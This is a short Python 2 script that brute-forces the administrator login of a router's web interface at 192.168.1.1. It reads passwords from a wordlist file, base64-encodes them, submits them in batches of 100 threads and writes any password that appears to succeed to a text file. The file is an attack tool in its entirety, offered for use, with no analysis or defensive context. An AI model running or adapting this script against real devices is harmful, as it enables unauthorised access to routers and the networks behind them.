# -*- coding: UTF-8 -*-


import urllib2
import base64
import urllib
import os
import threading
import string
import random
 
ip = "192.168.1.1"
user = 'admin'
 
isok=False
 
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36',
}
 
url = 'http://' + ip + '/goform/formLogin'
 
 
 
 
def dosomething(password):
    postData={
        'Language':'Chinese',
        'Language_set':'Chinese',
        'username':'admin',
        'password':password,
        'login':'��¼'
}   
    #print password
    postdata=urllib.urlencode(postData)
    #print postdata
    request=urllib2.Request(url,postdata,headers)
    response=urllib2.urlopen(request)
    text=response.read()
    if text.find('initValue')==-1:
        os.system("123.mp3")
        file=open('123.txt','a')
        file.write(password)
        isok=True
    text= unicode(text,'utf-8').encode('gb18030')
 
    #print text
 
 
 
class checkroute(threading.Thread):
    def __init__(self,passwd):
        threading.Thread.__init__(self)
        self.password=passwd
    def run(self):
        try:
            dosomething(self.password)       
        except:
            pass;
     
 
 
if __name__ == '__main__':
    threads = []
    sa=[]
    password=""
    count=0
    file=open('password.txt','r')
    while True:
        lines=file.readlines(11881380)
        print 'file read over!'
        if not lines:
            break
        for line in lines:
            print line
            password=base64.b64encode(line)
            count+=1
            threads.append(checkroute(password))
            if count%100==0:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join()
                threads=[]           
      
print "the end!!"